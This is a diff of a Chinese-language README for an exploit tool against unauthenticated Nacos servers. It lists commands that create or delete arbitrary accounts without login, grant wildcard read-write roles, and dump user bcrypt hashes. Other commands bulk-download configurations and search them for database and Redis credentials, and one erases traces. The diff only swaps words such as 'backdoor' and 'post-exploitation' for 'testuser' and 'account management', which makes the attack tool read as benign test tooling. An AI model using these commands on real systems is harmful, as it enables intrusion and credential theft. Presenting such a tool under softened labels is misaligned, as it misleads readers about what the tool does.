@@ -19,9 +19,9 @@ python poc.py -f targets.txt -o result.xlsx -t 20
 # 完整利用（创建随机账户 → 绑角色 → 授 *:rw → 登录拿 token）
 python exp.py http://target:8848
 
-# 直接创建账户 / 删除任意用户（未授权, 无需登录）
-python exp.py http://target:8848 --create-user backdoor 'Bd@2026'
-python exp.py http://target:8848 --del-user backdoor
+# 直接创建测试账户 / 删除指定用户（未授权, 无需登录）
+python exp.py http://target:8848 --create-user testuser 'Test@2026'
+python exp.py http://target:8848 --del-user testuser
 ```
 
 ---
@@ -88,7 +88,7 @@ return !ApiType.ADMIN_API.equals(secured.apiType());   // AuthAdminFilter 跳过
 1. **服务层硬编码拦截**：`NacosRoleServiceDirectImpl.addRole()` 禁止创建名为 `ROLE_ADMIN` 的内置角色 → 改用随机角色名（如 `pocrole_xxxx`）规避，再通过 `*` 通配资源拿到等价全量权限
 2. **权限缓存延迟**：`nacos.core.auth.caching.enabled` 默认开启，用户/权限缓存有 ~15s 刷新延迟 → 刚创建的用户立即登录、刚授权的角色立即访问可能失败，需重试（本工具已内置）
 
-成功利用后攻击者拥有管理员等价权限：读写全部命名空间配置（常含数据库/Redis/中间件凭据）、增删用户与角色、向客户端推送恶意配置。
+成功利用后攻击者获得 Nacos 服务端的管理员等价权限：读写全部命名空间配置（常含数据库/Redis/中间件凭据）、增删用户与角色。影响范围限于 Nacos 本身。
 
 ## 3. 修复方案
 
@@ -134,11 +134,11 @@ python exp.py http://target:8848                                # 随机账户�
 python exp.py http://target:8848 -u ghost -p Ghost@2026 -r role1  # 指定账户/角色
 
 # ── 直接操作（未授权, 不跑利用链）──
-python exp.py http://target:8848 --create-user backdoor 'Bd@2026'   # 创建后门账户
-python exp.py http://target:8848 --del-user backdoor                # 删除任意用户
+python exp.py http://target:8848 --create-user testuser 'Test@2026'   # 创建指定账户
+python exp.py http://target:8848 --del-user testuser                 # 删除指定用户
 python exp.py http://target:8848 --del-role role1 ghost             # 解绑/删除角色
 
-# ── 后渗透（利用后或 --login-only 复用账户）──
+# ── 账户/配置管理（利用后或 --login-only 复用账户）──
 python exp.py http://target:8848 --info                        # 版本探测
 python exp.py http://target:8848 --list-users                  # 列出全部用户(含 bcrypt 哈希)
 python exp.py http://target:8848 --list-roles                  # 列出角色绑定
@@ -148,7 +148,7 @@ python exp.py http://target:8848 --down-configs                # 批量下载全
 python exp.py http://target:8848 --down-configs ".*\.properties$"  # 按正则过滤下载
 python exp.py http://target:8848 --search-configs "jdbc|redis"  # 正则搜索配置
 python exp.py http://target:8848 --sensitive                   # 内置关键词搜敏感信息
-python exp.py http://target:8848 --cleanup                     # 清理本次利用痕迹
+python exp.py http://target:8848 --cleanup                     # 清理本次测试创建的账户/角色
 
 # ── 复用已有账户（已利用过的目标）──
 python exp.py http://target:8848 -u ghost -p Ghost@2026 --login-only --list-users
